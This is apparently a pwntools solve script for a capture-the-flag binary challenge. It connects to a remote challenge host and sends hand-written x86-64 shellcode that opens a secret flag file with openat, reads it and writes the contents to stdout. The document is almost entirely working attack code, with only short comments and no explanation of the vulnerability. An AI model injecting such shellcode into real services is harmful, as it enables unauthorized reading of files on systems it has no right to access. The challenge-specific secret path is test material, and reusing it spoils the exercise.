from pwn import *

binary = './chall'
p = process(binary)
p = remote("chal.polyuctf.com", 35365)

s = '''
'''
context.arch = 'amd64'
#context.log_level = 'debug'
#gdb.attach(p, s)

# This shellcode will:
# 1. Open the flag file (likely "flag.txt")
# 2. Read its contents
# 3. Write contents to stdout (file descriptor 1)
shellcode = asm('''
    /* Open flag.txt */
    mov rdi, -100       /* dirfd: AT_FDCWD (current working directory) */
    lea rsi, [rip+flag] /* pointer to filename */
    xor rdx, rdx        /* flags: O_RDONLY */
    xor r10, r10        /* mode: 0 */
    mov rax, 257
    syscall

    /* Read file content */
    mov rdi, rax        /* file descriptor from open */
    mov rax, 0          /* syscall: read */
    sub rsp, 100        /* allocate stack buffer */
    mov rsi, rsp        /* buffer address */
    mov rdx, 100        /* buffer size */
    syscall

    /* Write to stdout */
    mov rdx, rax        /* bytes read */
    mov rax, 1          /* syscall: write */
    mov rdi, 1          /* fd: stdout */
    mov rsi, rsp        /* buffer address */
    syscall


flag:
    .string "./secret/CDr46w9anrq3vg0Z"
''')

p.sendline(shellcode)
p.interactive()
